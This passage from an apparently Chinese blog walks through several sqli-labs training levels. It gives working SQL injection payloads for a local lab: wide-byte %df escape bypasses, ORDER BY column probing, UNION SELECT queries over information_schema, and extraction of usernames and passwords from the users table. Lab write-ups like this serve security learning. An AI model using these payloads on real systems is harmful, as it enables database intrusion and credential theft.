    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/</url>
    <content><![CDATA[<h4 id="查看登录后的原始界面，页面返回正常。"><a href="#查看登录后的原始界面，页面返回正常。" class="headerlink" title="查看登录后的原始界面，页面返回正常。"></a>查看登录后的原始界面，页面返回正常。</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585020800592.png" alt="1585020800592"></p>
<h4 id="使用单引号查看报错信息，有反斜杠，确定宽字节注入"><a href="#使用单引号查看报错信息，有反斜杠，确定宽字节注入" class="headerlink" title="使用单引号查看报错信息，有反斜杠，确定宽字节注入"></a>使用单引号查看报错信息，有反斜杠，确定宽字节注入</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585020848241.png" alt="1585020848241"></p>
<h4 id="宽字节注入使用-df加反斜杠"><a href="#宽字节注入使用-df加反斜杠" class="headerlink" title="宽字节注入使用%df加反斜杠\"></a>宽字节注入使用%df加反斜杠\</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;    &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585020912640.png" alt="1585020912640"></p>
<h4 id="使用注释符注释并用order-by-查询字段数，字段3错误"><a href="#使用注释符注释并用order-by-查询字段数，字段3错误" class="headerlink" title="使用注释符注释并用order by  查询字段数，字段3错误"></a>使用注释符注释并用order by  查询字段数，字段3错误</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  order by 3  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021051439.png" alt="1585021051439"></p>
<h4 id="查看字段2，字段2正确"><a href="#查看字段2，字段2正确" class="headerlink" title="查看字段2，字段2正确"></a>查看字段2，字段2正确</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021076357.png" alt="1585021076357"></p>
<h4 id="查看注入点"><a href="#查看注入点" class="headerlink" title="查看注入点"></a>查看注入点</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,2  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021105937.png" alt="1585021105937"></p>
<h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021135993.png" alt="1585021135993"></p>
<h4 id="查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制"><a href="#查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制" class="headerlink" title="查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制"></a>查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021224985.png" alt="1585021224985"></p>
<h4 id="查看users表，也需要改为16进制"><a href="#查看users表，也需要改为16进制" class="headerlink" title="查看users表，也需要改为16进制"></a>查看users表，也需要改为16进制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021276654.png" alt="1585021276654"></p>
<h4 id="查看username字段"><a href="#查看username字段" class="headerlink" title="查看username字段"></a>查看username字段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,group_concat(username)from users #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021309242.png" alt="1585021309242"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十一关JSP环境联合</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/</url>
    <content><![CDATA[<p>查看源码，发现只是在双引号的基础上加上了括号。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962946207.png" alt="1584962946207"></p>
<p>在网页中尝试，页面回显正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963054395.png" alt="1584963054395"></p>
<p>查看当前字段数，字段数为3的时候返回正常，为4的时候返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963094698.png" alt="1584963094698"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963106589.png" alt="1584963106589"></p>
<p>查看注入点</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963190594.png" alt="1584963190594"></p>
<p>查看当前数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963213201.png" alt="1584963213201"></p>
<p>查看数据下的表</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963252775.png" alt="1584963252775"></p>
<p>查看users表下的字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963287883.png" alt="1584963287883"></p>
<p>查看username字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963314282.png" alt="1584963314282"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三关GET联合</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前是否存在sql注入，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327519338.png" alt="1584327519338"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们发现报错了，报错内容里显示引号后面有一个括号，加上括号试试记住因为加上引号了还要注释一下</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) --+</span><br><span class="line">返回正确，然后我们来查看字段数</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327620007.png" alt="1584327620007"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库字段数</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3 --+</span><br><span class="line">order by 3为正确，我们再来试试4</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 4 --+</span><br><span class="line">4错误说明当前字段为3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327700205.png" alt="1584327700205"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327733997.png" alt="1584327733997"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,database() --+</span><br><span class="line">这里在id&#x3D;1的地方加上一个负号，报错显示，如果不使用报错显示只会显示一个内容，</span><br><span class="line">我们看到了当前数据库是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327789577.png" alt="1584327789577"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们查看security数据库下有什么表</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327934961.png" alt="1584327934961"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发现有当前emails，referers，uagents，users，其中users在大部分情况下是存放用户信息的，我们来进行查看一下users表</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">当前表下有这么多字段，其中发现有id，username，password字段，我们查看一下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584328017309.png" alt="1584328017309"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看id，username，password字段里的数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(id,username,password)from users --+</span><br><span class="line">查询到了我们想要的内容</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584328079964.png" alt="1584328079964"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十二关JSP环境宽字节</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/</url>
    <content><![CDATA[<p>查看初始页面。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584967761156.png" alt="1584967761156"></p>
<p>加上单引号查看报错信息，返回错误，引号中有一个反斜杠，可以判定为宽字节注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584967781936.png" alt="1584967781936"></p>
<p>可以先尝试将引号中按照要求加入反斜杠，再次查询，发现返回这么多反斜杠</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584967870233.png" alt="1584967870233"></p>
<p>id=1’———-&gt;id=1&#39;———&gt;id=1%5c%27</p>
<p>id=1%df’———id=1%df%5c%27———-&gt;id=1%DF5C%27——–&gt;id=1運’</p>
<p>其实就是利用gbk是多字节的编码，两个字节代表一个汉字</p>
<p>%df    %5c   组合出了一个  運 字</p>
<p>因此  可以注入</p>
<h5 id="将-df带入，页面返回正常"><a href="#将-df带入，页面返回正常" class="headerlink" title="将%df带入，页面返回正常"></a>将%df带入，页面返回正常</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968598018.png" alt="1584968598018"></p>
<p>查看当前字段数，字段4返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968639215.png" alt="1584968639215"></p>
<p>使用字段3，返回正确</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968661231.png" alt="1584968661231"></p>
<p>查看注入点，注入点2,3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968694716.png" alt="1584968694716"></p>
<p>查看当前数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968713308.png" alt="1584968713308"></p>
<p>查看表名，在宽字节中不能使用  ‘security’ ，而需要使用database()来获取表名，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968998081.png" alt="1584968998081"></p>
<p>也可以将security编码成16进制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584969393665.png" alt="1584969393665"></p>
<p>获取users表下的字段，还是使用16进制方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584969451372.png" alt="1584969451372"></p>
<p>查看suername字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(username)from users--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584969580473.png" alt="1584969580473"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十三关GET宽字节</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/</url>
    <content><![CDATA[<p>查看最初界面。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584970985279.png" alt="1584970985279"></p>
<p>查看源码，使用单引号闭合</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584970995565.png" alt="1584970995565"></p>
<p>加上单引号查看，发现返回反斜杠，说明宽字节注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971075138.png" alt="1584971075138"></p>
<p>按照要求加入反斜杠，确定为宽字节注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971116599.png" alt="1584971116599"></p>
<p>加入%df，报错了，发现没有用注释符注释引号</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971178309.png" alt="1584971178309"></p>
<p>加上注释符，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971217764.png" alt="1584971217764"></p>
<p>查看字段数，4报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;1%df\&#39;  order by 4  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971252363.png" alt="1584971252363"></p>
<p>查看字段数3，页面回显正常，说明字段数正确</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971275954.png" alt="1584971275954"></p>
<p>查看注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,3  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971335124.png" alt="1584971335124"></p>
